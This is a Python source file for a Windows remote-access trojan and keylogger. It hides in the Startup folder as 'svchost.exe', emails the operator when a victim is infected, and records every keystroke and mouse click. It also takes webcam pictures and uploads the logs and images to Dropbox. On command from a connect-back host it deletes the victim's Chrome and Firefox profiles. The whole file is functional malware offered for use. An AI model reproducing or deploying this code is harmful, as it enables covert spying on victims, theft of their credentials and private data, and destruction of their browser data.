import socket               # Import socket module
import dropbox
from cv2 import *
import os
import pythoncom, pyHook
import time
import smtplib
import thread


execname = "requiste.exe" #Change to name of executable you create.
dropboxid = "" #Get DropboxID and sethere
hostid = "" #Set host
openport = 0 #Change to port open

#Functions
def copier():
    exe
    os.system('copy '+execname+' "%USERPROFILE%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/svchost.exe"')       
time.sleep(1)
copier()
def startmessage():
    try:
            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.ehlo()
            server.starttls()
            server.ehlo()
            #Next, log in to the server
            server.login("faker6921@gmail.com", "fakerbot1221")
            #Send the mail
            msg = "\n"+"You got a client!" # The /n separates the message from the headers
            server.sendmail("faker6921@gmail.com", "faker360noscope@gmail.com", msg)
            sender()
    except:
            pass
startmessage()
def keyz(event): # same logic as mouse 
    home = os.path.expanduser("~")
    op = list("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")
    ai = []
    activ = False
    if chr(event.Ascii) in op:
          
          with open(os.path.join(home+'\AppData\Local',"sdk.txt"), "a") as txt:
              a=chr(event.Ascii)
              txt.write(a)
              txt.close()  
    else:
            ai.append(event.Key)
            with open(os.path.join(home+'\AppData\Local',"sdk.txt"), "a") as txt:
                if ai[0] != 'Lshift' or ai[0] not in list('1234567890'):
                    if event.Key == 'Space':# prints backspace caps lock etc properly
                        
                        txt.write(' ')
                        txt.close()
                    if event.Key == 'Tab':
                        
                        txt.write('\nTab\n')
                        txt.close()
                    if event.Key == 'Back':
                        txt.write('\n -Back- \n')
                        txt.close()
                    if event.Key == 'Delete':
                        txt.write('\n -Delete- \n')
                        txt.close()
                    if event.Key == 'Lshift' or event.Key == 'Rshift':
                        txt.write('\n -Shift- \n')
                        txt.close()
                        #Oem_Period
                        #Capital
                    if event.Key == 'Oem_Period':
                        txt.write('\n -Dot- \n')
                        txt.close()
                    if event.Key == 'Captial':
                        txt.write('\n -CapsLock-  \n')
                        txt.close()
                    if event.Key == 'Return':
                        txt.write(' -Enter- ')
                        
                    if activ == False:
                        if event.Key == '1':
                             txt.write('1\n')
                             txt.close()
                        if event.Key == '2':
                            txt.write('2\n')
                            txt.close()
                        if event.Key == '3':
                             txt.write('3\n')
                             txt.close()
                        if event.Key == '4':
                             txt.write('4\n')
                             txt.close()
                        if event.Key == '5':
                             txt.write('5\n')
                             txt.close()
                        if event.Key == '6':
                             txt.write('6\n')
                             txt.close()
                        if event.Key == '7':
                             txt.write('7\n')
                             txt.close()
                        if event.Key == '8':
                             txt.write('8\n')
                             txt.close()
                        if event.Key == '9':
                             txt.write('9\n')
                             txt.close()
                        if event.Key == '0':
                             txt.write('0\n')
                             txt.close()
                    else:
                        txt.write('\n -'+event.Key+'- \n')
                        txt.close()
                        
                    
                    # return True to pass the event to other handlers
                    
                    if activ == True:
                        if ai[1] == '1':
                             txt.write('!')
                             txt.close()
                        if ai[1] == '2':
                            txt.write('@')
                            txt.close()
                        if ai[1] == '3':
                             txt.write('#')
                             txt.close()
                        if ai[1] == '4':
                             txt.write('$')
                             txt.close()
                        if ai[1] == '5':
                             txt.write('%')
                             txt.close()
                        if ai[1] == '6':
                             txt.write('^')
                             txt.close()
                        if ai[1] == '7':
                             txt.write('&')
                             txt.close()
                        if ai[1] == '8':
                             txt.write('*')
                             txt.close()
                        if ai[1] == '9':
                             txt.write('(')
                             txt.close()
                        if ai[1] == '0':
                             txt.write(')')
                             txt.close()
                        ai = []
                    else:
                        activ = True
    return True
def onclick(event):
    home = os.path.expanduser("~")
    with open(os.path.join(home+'\AppData\Local',"sdk.txt"), "a") as text_file:
        text_file.write("\n -Clicked- \n")
        text_file.close()
    return True

def closer():
    browserExe = "firefox.exe"
    browserexe = 'chrome.exe'
    os.system("taskkill /f /im "+browserExe)
    os.system("taskkill /f /im "+browserexe)

def rem():
    os.system('rmdir /s /q "%USERPROFILE%\AppData\Local\Google\Chrome"')
    os.system('rmdir /s /q  "%USERPROFILE%\AppData\Roaming\Mozilla"')
def nukebrowser(): #clear browser closes it -Add function
    closer()
    rem()
    
def startlogger():#starts logger -Add function
    # create a hook manager
    hmm = pyHook.HookManager()# same logic as mouse 
    # watch for all key events
    hmm.KeyDown = keyz # don't give () when defining function name so argument error doesn't come.Hookmanger will deal with event argument.same logic as mouse  , except its hm.KeyDown here.
    #watch for mouse events (refined way)
    hmm.SubscribeMouseAllButtonsDown(onclick)
    # set the hook
    hmm.HookKeyboard() # same logic as mouse , expect HookKeyboard instead of HookMouse.
    hmm.HookMouse()
    # wait forever
    pythoncom.PumpMessages() # same logic as mouse 
    #unhook mouse less lag
    hmm.UnhookMouse()



def clearer():#clear log - Add function
    home = os.path.expanduser("~")
    with open(os.path.join(home+'\AppData\Local',"sdk.txt"), "w") as text_file:
            text_file.write("\n"+"")
            text_file.close()
def captu(source):#capturer
    try:
        home = os.path.expanduser("~")
        cam = VideoCapture(source)   # 0 -> index of camera
        s, img = cam.read()
        if s:    # frame captured without any errors
            namedWindow("cam-test",CV_WINDOW_AUTOSIZE)
            imshow("cam-test",img)
            
            destroyWindow("cam-test")
            imwrite(home+"/AppData/Local/picer.jpg",img) #save im
    except Exception as e:
        print e

def dropboxer(filename): #uploader
    
    try:
        client = dropbox.client.DropboxClient(dropboxid)
        
        f = open(filename, 'rb')
        response = client.put_file(filename, f)
        print 'uploaded: ', response
    except Exception as e:
        print e

def pictak(sour): #Take pic -Add function
    home = os.path.expanduser("~")
    captu(sour)
    time.sleep(1)
    lel = home+"\AppData\Local\picer.jpg"
    s = lel.replace('\\', '/')
    dropboxer(s)
def uplod(): #upload log - Add function
    home = os.path.expanduser("~")
    lel = home+"\AppData\Local\sdk.txt"
    s = lel.replace('\\', '/')
    dropboxer(s)
try:
    thread.start_new_thread(startlogger,())
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)

        # Create a socket object
        host = hostid# Get local machine name
        
        port = openport      # Reserve a port for your service.

        try:
            print "Waiting for connection: "
            s.connect((host, port))
            print "Connected: "
            print ""
          
        except Exception as e:
            pass
        try:
            while True:
                s.send('hello')
                message = s.recv(1048576)
                if message == "":
                    pass
                if message == "nuke browser":
                    nukebrowser()              #s.recv (Message sent)
                    message =  ""
                if message == "capture pic":
                    time.sleep(1)
                    message = s.recv(1048576)
                    print "message recieved",message
                    pictak(int(message))
                    message = ""
                if message == "clear log":
                    clearer()
                    message = ""
                if message == "capture log":
                    uplod()
                    message = ""
                # To trigger error to reset to wait for connection.
        except Exception as e:
            pass
except Exception as e:
    print e
finally:
    s.send('closer')
    s.close()                    # Close the socket when done
